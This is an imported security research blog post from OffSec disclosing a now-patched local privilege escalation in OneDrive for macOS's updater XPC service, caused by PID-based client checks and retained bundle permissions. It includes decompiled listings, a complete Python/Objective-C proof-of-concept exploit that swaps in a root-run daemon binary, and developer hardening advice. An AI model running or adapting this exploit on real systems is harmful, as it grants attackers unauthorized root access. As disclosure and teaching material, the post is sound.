---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-01-31_microsoft-onedrive-for-macos-local-privilege-escalation.md
original_filename: 2022-01-31_microsoft-onedrive-for-macos-local-privilege-escalation.md
title: Microsoft OneDrive For Macos Local Privilege Escalation
category: documents
detected_topics:
- supply-chain
- sso
- access-control
- command-injection
- otp
- automation-abuse
tags:
- imported
- documents
- supply-chain
- sso
- access-control
- command-injection
- otp
- automation-abuse
language: en
raw_sha256: b83d99fdcec5fb3ec1ccca2bb748dbdb5864f5c769c4d55f31e5ce0392e96d83
text_sha256: 9528f1706d119f445ab515e2a9d8b38a18a0eed558ee5d672e171e584dd462fc
ingested_at: '2026-06-28T07:32:09Z'
sensitivity: unknown
redactions_applied: false
---

# Microsoft OneDrive For Macos Local Privilege Escalation

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-01-31_microsoft-onedrive-for-macos-local-privilege-escalation.md
- Source Type: markdown
- Detected Topics: supply-chain, sso, access-control, command-injection, otp, automation-abuse
- Ingested At: 2026-06-28T07:32:09Z
- Redactions Applied: False
- Raw SHA256: `b83d99fdcec5fb3ec1ccca2bb748dbdb5864f5c769c4d55f31e5ce0392e96d83`
- Text SHA256: `9528f1706d119f445ab515e2a9d8b38a18a0eed558ee5d672e171e584dd462fc`


## Content

---
title: "Microsoft OneDrive For Macos Local Privilege Escalation"
page_title: "Microsoft OneDrive for macOS Local Privilege Escalation | Offensive Security"
url: "https://www.offensive-security.com/offsec/microsoft-onedrive-macos-local-privesc/"
final_url: "https://www.offsec.com/blog/microsoft-onedrive-macos-local-privesc/"
authors: ["Offensive Security (@offsectraining)"]
programs: ["Microsoft"]
bugs: ["Local Privilege Escalation", "MacOS"]
publication_date: "2022-01-31"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 2959
---

[Blog](/blog/)

/

Microsoft OneDrive for macOS Local Privilege Escalation

![](https://www.offsec.com/app/uploads/2020/11/MSXPC-privilege-escalation-1024x536.png)

[Research & Tutorials](/blog/category/research-tutorials/)

Jan 31, 2022

# Microsoft OneDrive for macOS Local Privilege Escalation

Security researchers at Offensive Security discovered a vulnerability in the XPC service of Microsoft OneDrive. Here’s how it works and how to secure it.

![OffSec Team](/_astro/byline.ClrL6n6g_1uOybF.svg) OffSec Team

5 min read

In this blog post, we will share the details of a vulnerability Offensive Security discovered in the XPC service of Microsoft OneDrive. Although Microsoft secured these services reasonably well, we will see how small mistakes in the code can have serious impacts.

It took Microsoft over a year to fix the vulnerability and the patched version of OneDrive was released in 2021 December. A CVE was not assigned to this vulnerability.

## Root cause of the Vulnerability

The vulnerability in question stems from a combination of two issues.

The XPC Daemon uses the process ID (PID) to verify the client, which results in an insecure client verification. Additionally, the XPC Daemon allows the installation of a new OneDrive.app. Although its signature is properly verified and can’t be bypassed, it retains the file permission of the new OneDrive.app. This allows us to overwrite an existing OneDrive.app, and give world write permission to all files and directories, including the root-invoked helper. This helper can be replaced with a custom binary resulting in root-level execution controlled by low-priv users.

OneDrive installs two Mach services, com.microsoft.OneDriveUpdaterDaemon and com.microsoft.OneDriveStandaloneUpdaterDaemon that are defined in the PLIST files located under [ccie]/Library/LaunchDaemons/[/ccie]. Both services contain the same methods and therefore the same vulnerability. These service binaries are located inside the main application’s bundle, at [ccie]/Applications/OneDrive.app/Contents/OneDriveUpdaterDaemon.xpc/Contents/MacOS/OneDriveUpdaterDaemon[/ccie] and [ccie]/Applications/OneDrive.app/Contents/StandaloneUpdaterDaemon.xpc/Contents/MacOS/StandaloneUpdaterDaemon[/ccie].

We will concentrate on the OneDriveUpdaterDaemon binary, although OneDriveStandaloneUpdaterDaemon should be the same. We will start by checking the shouldAcceptNewConnection: method.
  
  
  [cce]
  /* @class OneDriveUpdaterDaemon */
  
  -(char)listener:(void *)arg2 shouldAcceptNewConnection:(void *)arg3 {
  
  r15 = self;
  
  rax = [arg3 retain];
  
  r12 = rax;
  
  rax = [r15 isValidConnection:rax];
  [/cce]

Listing 1 – The shouldAcceptNewConnection: method of the XPC service

The signature of the connecting client will be validated via the isValidConnection: method.
  
  
  [cce]
  /* @class OneDriveUpdaterDaemon */
  
  -(char)isValidConnection:(void *)arg2 {
  
  r15 = self;
  
  r14 = [arg2 retain];
  
  NSLog(@"Validating connection");
  
  rax = [r14 processIdentifier];
  
  var_40 = **_kSecGuestAttributePid;
  [/cce]

Listing 2 – The isValidConnection: method of the XPC service

The isValidConnection: method uses the PID to validate the connecting client instead of the audit_token. This will allow us to talk to the XPC service with PID reuse attacks.

Next, using class-dump we can discover the methods that are exposed by the updater daemon. These are defined by the OneDriveUpdaterDaemonProtocol protocol.
  
  
  [cce]
  @protocol OneDriveUpdaterDaemonProtocol
  
  - (void)StopDaemonAfterReply:(void (^)(BOOL))arg1;
  
  - (void)RunKextInstallerIfNeededWithReply:(void (^)(int))arg1;
  
  - (void)RefreshStandaloneUpdaterScheduledTaskWithUpdateInterval:(int)arg1 withReply:(void (^)(NSError *))arg2;
  
  - (void)InstallNewApplicationAtPath:(NSString *)arg1 toPath:(NSString *)arg2 setAttributesOnTempDir:(BOOL)arg3 withReply:(void (^)(NSError *))arg4;
  
  - (void)TrashOldApplication:(NSString *)arg1 withReply:(void (^)(NSString *, NSError *))arg2;
  
  - (void)Ping:(void (^)(void))arg1;
  
  @end
  [/cce]

Listing 3 – OneDriveUpdaterDaemonProtocol definition

The method we are most interested in is [ccie]InstallNewApplicationAtPath:toPath:setAttributesOnTempDir:withReply:[/ccie]. It’s rather long, so we will only show a relevant snippet of it.
  
  
  [cce]
  1 /* @class OneDriveUpdaterDaemon */
  2 -(void)InstallNewApplicationAtPath:(void *)arg2 toPath:(void *)arg3 setAttributesOnTempDir:(char)arg4 withReply:(void *)arg5 {
  3 var_7C = arg4;
  4 r12 = [arg2 retain];
  5 var_88 = [arg3 retain];
  6 (...)
  7 rax = [self isValidPackagePath:r12 withCodesignValidation:0x1];
  8 (...)
  9 if (rax == 0x0) {
  10         rbx = [[r14 isValidInstallationPath:var_88] retain];
  11 (...)
  12 loc_100003db7:
  13 r14 = [[NSFileManager defaultManager] retain];
  14 r13 = [[NSURL fileURLWithPath:r13] retain];
  15 rax = [NSURL fileURLWithPath:var_70];
  16 rax = [rax retain];
  17 var_48 = 0x0;
  18 rcx = rax;
  19 r12 = [r14 moveItemAtURL:r13 toURL:rcx error:r8];
  20 (...)
  21 r15 = [[r14 isValidPackagePath:var_70 withCodesignValidation:rcx] retain];
  [/cce]

Listing 4 – Part of the InstallNewApplicationAtPath:toPath:setAttributesOnTempDir:withReply: method

The InstallNewApplicationAtPath:toPath:setAttributesOnTempDir:withReply: method takes a path to an application bundle as its first argument, and copies it to the location specified with the toPath argument (lines 12-19). The source path is expected to be a valid OneDrive.app. Before the copy happens, we find that the signature of OneDrive.app, and the target location of our copy will be properly verified (lines 7 and 10). If the signature is modified after the move, the process will fail because of an additional signature verification (line 21). The method doesn’t allow us to overwrite an existing path.

We can overcome this by using the TrashOldApplication:withReply: method of the XPC service, which will allow us to remove an existing installation that is normally owned by root.

Although everything is properly verified, this functionality is exploitable because the permissions of the OneDrive.app that we copy are retained during the move operation. This allows us to perform a fake update, and change the directory permissions. As a consequence, we can initiate an update but provide a OneDrive.app with world write permissions.

## Exploitation of Microsoft OneDrive

To exploit OneDrive we will first copy the existing OneDrive.app bundle into the /tmp/ directory. As OneDrive.app is readable by all users, we are able to perform the copy to /tmp without any permission issues.

Next we’ll modify the permissions of the copied application to 777 which grants world writable rights, among other permissions. We can do this because the copied files and folders will be owned by our user.

Once the permissions are set, we will call the [ccie]TrashOldApplication:withReply:[/ccie] method of the XPC service, which will delete the original OneDrive app. This will remove [ccie]/Applications/OneDrive.app[/ccie] completely. Note that, although the XPC service is still running, and will keep running, this deletion also removes the XPC service binary. This is possible because macOS doesn’t lock the binary of the running process.

With the old application removed, we can invoke [ccie]InstallNewApplicationAtPath:toPath:setAttributesOnTempDir:withReply:[/ccie] to copy the modified OneDrive.app to the original location (/Applications).

Since the recently transferred application is world writable due to the permissions we set earlier, we can replace the [ccie]/Applications/OneDrive.app/Contents/OneDriveUpdaterDaemon.xpc/Contents/MacOS/OneDriveUpdaterDaemon[/ccie] with our own binary.

Finally, we wait until the current XPC daemon exits, (as it’s not being used, launchd will shut it down automatically after some time of inactivity). Once the daemon exists, we’ll invoke the Mach service which will result in our binary being executed as root.

A Python script proof of concept that automates the entire exploit can be found below.
  
  
  [cce]
  import os, time
  
  xpc_exploit = """
  
  #import &lt;Foundation/Foundation.h&gt;
  
  #include &lt;spawn.h&gt;
  
  #include &lt;signal.h&gt;
  
  static NSString* XPCHelperMachServiceName = @"com.microsoft.OneDriveUpdaterDaemon";
  
  @protocol OneDriveUpdaterDaemonProtocol
  
  - (void)StopDaemonAfterReply:(void (^)(BOOL))arg1;
  
  - (void)RunKextInstallerIfNeededWithReply:(void (^)(int))arg1;
  
  - (void)RefreshStandaloneUpdaterScheduledTaskWithUpdateInterval:(int)arg1 withReply:(void (^)(NSError *))arg2;
  
  - (void)InstallNewApplicationAtPath:(NSString *)arg1 toPath:(NSString *)arg2 setAttributesOnTempDir:(BOOL)arg3 withReply:(void (^)(NSError *))arg4;
  
  - (void)TrashOldApplication:(NSString *)arg1 withReply:(void (^)(NSString *, NSError *))arg2;
  
  - (void)Ping:(void (^)(void))arg1;
  
  @end
  
  int main(void) {
  
  //only 2 is the race count, this might need to be tuned depending on the speed of the VM/Mac we use. If it's slow, this needs to be set to 1, if fast then try increasing by 1
  
  #define RACE_COUNT 2
  
  #define kValid "/Applications/OneDrive.app/Contents/OneDrive Updater.app/Contents/MacOS/OneDriveUpdater"
  
  extern char **environ;
  
  int pids[RACE_COUNT];
  
  for (int i = 0; i &lt; RACE_COUNT; i++)
  
  {
  
  int pid = fork();
  
  if (pid == 0)
  
  {
  
  NSString*  _serviceName = XPCHelperMachServiceName;
  
  NSXPCConnection* _agentConnection = [[NSXPCConnection alloc] initWithMachServiceName:_serviceName options:4096];
  
  [_agentConnection setRemoteObjectInterface:[NSXPCInterface interfaceWithProtocol:@protocol(OneDriveUpdaterDaemonProtocol)]];
  
  [_agentConnection resume];
  
  id obj = [_agentConnection remoteObjectProxyWithErrorHandler:^(NSError* error)
  
  {
  
  (void)error;
  
  NSLog(@"Connection Failure");
  
  }];
  
  NSLog(@"obj: %@", obj);
  
  NSLog(@"conn: %@", _agentConnection);
  
  //call the XPC
  
  //First we will delete the old app
  
  NSString* pkg = @"/Applications/OneDrive.app";
  
  [obj TrashOldApplication:pkg withReply:^(NSString* arg3, NSError* arg4){
  
  NSLog(@"%@",arg3);
  
  }];
  
  //Next we install the modified app
  
  NSString* new = @"/tmp/OneDrive.app";
  
  NSString* path = @"/Applications";
  
  [obj InstallNewApplicationAtPath:new toPath:path setAttributesOnTempDir:YES withReply:^(NSError* arg4){
  
  NSLog(@"%@",arg4);
  
  }];
  
  char target_binary[] = kValid;
  
  char *target_argv[] = {target_binary, NULL};
  
  posix_spawnattr_t attr;
  
  posix_spawnattr_init(&amp;attr);
  
  short flags;
  
  posix_spawnattr_getflags(&amp;attr, &amp;flags);
  
  flags |= (POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED);
  
  posix_spawnattr_setflags(&amp;attr, flags);
  
  posix_spawn(NULL, target_binary, NULL, &amp;attr, target_argv, environ);
  
  }
  
  printf("forked %d\\n", pid);
  
  pids[i] = pid;
  
  }
  
  // keep the children alive
  
  sleep(10);
  
  cleanup:
  
  for (int i = 0; i &lt; RACE_COUNT; i++)
  
  {
  
  pids[i] &amp;&amp; kill(pids[i], 9);
  
  }
  
  }
  
  """
  
  new_daemon = """
  
  #include &lt;stdlib.h&gt;
  
  int main() {
  
  system("/System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal");
  
  }
  
  """
  
  #Copy Application
  
  print("copy OneDrive.app to /tmp/")
  
  os.system("cp -R /Applications/OneDrive.app /tmp")
  
  #update permissions
  
  print("change permissions of the app")
  
  os.system("chmod -R 777 /tmp/OneDrive.app")
  
  #write out exploit and compile
  
  print("writing and compiling exploit")
  
  exp_f = open("/tmp/exp.m","w")
  
  exp_f.write(xpc_exploit)
  
  exp_f.close()
  
  os.system("gcc -framework Foundation /tmp/exp.m -o /tmp/exp")
  
  #write out new daemon and compile
  
  print("writing and compiling new daemon")
  
  dae_f = open("/tmp/OneDriveUpdaterDaemon.c","w")
  
  dae_f.write(new_daemon)
  
  dae_f.close()
  
  os.system("gcc /tmp/OneDriveUpdaterDaemon.c -o /tmp/OneDriveUpdaterDaemon")
  
  #invoke exploit
  
  print("invoking exploit")
  
  os.system("/tmp/exp")
  
  #overwrite daemon
  
  print("overwrite daemon")
  
  os.system("cp /tmp/OneDriveUpdaterDaemon /Applications/OneDrive.app/Contents/OneDriveUpdaterDaemon.xpc/Contents/MacOS/OneDriveUpdaterDaemon")
  
  #sleep again
  
  print("sleeping 60 sec for the old daemon to exit")
  
  time.sleep(60)
  
  #invoke exploit
  
  print("invoking exploit again, to trigger the start of the daemon")
  
  os.system("/tmp/exp")
  
  print("if failed, try to rerun the exploit only once the old daemon quit: /tmp/exp")
  [/cce]

Listing 5 – MS OneDrive exploit POC

As it’s a race condition with PID reuse, the RACE_COUNT might need to be adjusted depending on the speed of the machine used. A successful exploit will result in Terminal popup as root.

## Advice for developers

We recommend the following practices to make a connection validation secure against similar attacks.

The client process verification in the [ccie]shouldAcceptNewConnection:[/ccie] call should occur based on the audit_token and not the PID. The code signing validation of the client must ensure that it is dealing with a valid application from the expected organization. 

In addition, the client must be hardened against injection attacks. This can be accomplished by compiling the client with a hardened runtime or with library validation. The client also must not have the [ccie]com.apple.security.cs.disable-library-validation[/ccie] and [ccie]com.apple.security.get-task-allow[/ccie] entitlements, since these would allow other processes to inject code into the app, resulting in malicious processes communicating with the XPC service.

## Wrap up

In this post we discussed an XPC vulnerability in Microsoft OneDrive, which was due to the combination of two small issues in the XPC service. Eliminating one can prevent the exploit. 

The application is vulnerable to improper client verification in the XPC helper tool. Generally speaking, not securing this connection properly allows other applications to connect, and call the methods exposed by the service. This often leads to privilege escalation scenarios, thus making this validation crucial from a security perspective.

* * *

###### About the Author

_Csaba Fitzl has worked for 6 years as a network engineer and 8 years as a blue/red teamer in a large enterprise focusing on malware analysis, threat hunting, exploitation, and defense evasion. Currently, he is focusing on macOS research and working at OffSec as a content developer. He gives talks and workshops at various international IT security conferences, including Hacktivity, hack.lu, Troopers, SecurityFest, DEFCON, and Objective By The Sea._

Share

[ ](mailto:?subject=Microsoft OneDrive for macOS Local Privilege Escalation&body=Security researchers at Offensive Security discovered a vulnerability in the XPC service of Microsoft OneDrive. Here's how it works and how to secure it.%0Ahttps://www.offsec.com/blog/microsoft-onedrive-macos-local-privesc/) [ ](https://www.linkedin.com/sharing/share-offsite/?url=https://www.offsec.com/blog/microsoft-onedrive-macos-local-privesc/) [ ](https://twitter.com/intent/tweet?url=https://www.offsec.com/blog/microsoft-onedrive-macos-local-privesc/&via=offsectraining) [ ](https://www.reddit.com/submit?url=https%3A%2F%2Fwww.offsec.com%2Fblog%2Fmicrosoft-onedrive-macos-local-privesc%2F&title=Microsoft OneDrive for macOS Local Privilege Escalation)

[ Previous ](/blog/topic-exercises/) [ Next ](/blog/what-to-expect-new-oscp-exam/)

## Latest from OffSec

[View all blogs](/blog/)
